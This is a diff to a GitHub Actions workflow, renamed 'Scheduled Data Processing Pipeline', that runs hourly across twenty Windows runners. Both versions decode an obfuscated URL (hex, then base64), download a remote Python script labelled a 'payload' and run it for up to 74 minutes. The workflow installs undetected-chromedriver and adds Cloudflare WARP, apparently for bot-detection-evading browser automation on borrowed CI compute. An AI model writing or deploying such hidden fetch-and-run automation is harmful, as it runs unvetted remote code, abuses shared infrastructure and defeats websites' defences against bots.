@@ -1,4 +1,4 @@
-name: Distributed Pipeline Processor
+name: Scheduled Data Processing Pipeline
 
 on:
   workflow_dispatch:
@@ -6,83 +6,65 @@ on:
     - cron: '0 * * * *'
 
 concurrency:
-  group: cluster-${{ github.workflow }}-${{ github.ref }}
+  group: runner-pool-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
-  cluster-runners:
-    name: Cluster-Pod-#${{ matrix.runner_id }}
+  cluster-workers:
+    name: "Pod-${{ matrix.shard_id }}"
     runs-on: windows-2022
     timeout-minutes: 75
 
     strategy:
       fail-fast: false
       matrix:
-        runner_id: [01, 02, 03, 04, 05, 06, 07, 08, 09, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        shard_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      - name: Initialize Runtime & Resolve Payloads
-        shell: pwsh
+      - name: Environment Setup & Script Download
+        shell: bash
         run: |
-          Write-Host "[INIT] Setting up environment for Pod ${{ matrix.runner_id }}..."
+          echo ">>> [SYSTEM] Starting Shard-${{ matrix.shard_id }} setup..."
+          
+          # فك التشفير والتنزيل باستخدام curl حصراً
+          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2g0L3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
+          
+          curl -sL "$URL_MAIN" -o start.py
+          
+          echo ">>> [SYSTEM] Installing Python modules..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo ">>> [SYSTEM] Ready to execute."
 
-          # تثبيت الحزم المطلوبة
-          python -m pip install --quiet --upgrade pip
-          pip install --quiet selenium undetected-chromedriver requests
-
-          # فك تشفير الروابط عبر Hex وتحميل الملفات مباشرة باستخدام بايثون
-          $fetchCode = @"
-          import bytes
-          import urllib.request
-
-          raw_assets = {
-              'app_core.py': '68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368332f7265736f6c76652f6d61696e2f73746172745f736872696e6b5f6e65772e7079',
-              'hash.py': '68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368762f7265736f6c76652f6d61696e2f686173682e7079'
-          }
-
-          for filename, hex_val in raw_assets.items():
-              target_url = bytes.fromhex(hex_val).decode('utf-8')
-              req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
-              with urllib.request.urlopen(req) as resp, open(filename, 'wb') as out_f:
-                  out_f.write(resp.read())
-          "@
-
-          python -c "$fetchCode"
-          Write-Host "[READY] Assets resolved and downloaded successfully."
-
-      - name: Execute Managed Subprocess
+      - name: Launch Payload & Time Monitor
         shell: pwsh
         env:
           PYTHONIOENCODING: "utf-8"
-          PYTHONUNBUFFERED: "1"
         run: |
-          Write-Host "[EXECUTION] Launching core payload on Pod: ${{ matrix.runner_id }}"
+          Write-Output "[INFO] Initiating start.py on Instance ${{ matrix.shard_id }}..."
           
-          # إضافة مسار Cloudflare WARP للبيئة
-          $warpDir = Join-Path $env:ProgramFiles "Cloudflare\Cloudflare WARP"
-          if (Test-Path $warpDir) { $env:Path = "$warpDir;$env:Path" }
-
-          # تشغيل العملية في الخلفية باستخدام ProcessStartInfo
-          $psi = New-Object System.Diagnostics.ProcessStartInfo
-          $psi.FileName = "python"
-          $psi.Arguments = "app_core.py"
-          $psi.UseShellExecute = $false
-          $process = [System.Diagnostics.Process]::Start($psi)
-
-          Write-Host "[WATCHDOG] Timer active: Max window is 4440 seconds (74 minutes)..."
-
-          # مراقبة العملية حتى 74 دقيقة (4440000 ميلي ثانية)
-          $completed = $process.WaitForExit(4440000)
-
-          if (-not $completed) {
-              Write-Warning "[ALERT] Threshold reached. Stopping process safely..."
-              $process.Kill($true)
-              Write-Host "[OK] Process killed cleanly by watchdog."
-          } else {
-              Write-Host "[COMPLETE] Subprocess exited with code $($process.ExitCode)."
+          $env:PATH = $env:PATH + ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ProcessArgs = @{
+              FilePath = "python"
+              ArgumentList = "start.py"
+              PassThru = $true
+              NoNewWindow = $true
+          }
+          $activeProcess = Start-Process @ProcessArgs
+          
+          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 74 mins."
+          
+          try {
+              Wait-Process -InputObject $activeProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output "[SUCCESS] Task completed within limits."
+          } 
+          catch {
+              Write-Output "[TIMEOUT] 74 minutes reached. Forcing process kill to transition..."
+              Stop-Process -InputObject $activeProcess -Force
+              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 1 Hour and 14 mins."
           }
 
-      - name: Cleanup & Teardown
-        if: always()
-        shell: pwsh
-        run: Write-Host "[POD LIFECYCLE] Pod #${{ matrix.runner_id }} has finished execution."
+      - name: Finalize
+        shell: bash
+        run: echo "<<< [SYSTEM] Worker-${{ matrix.shard_id }} finished its lifecycle."
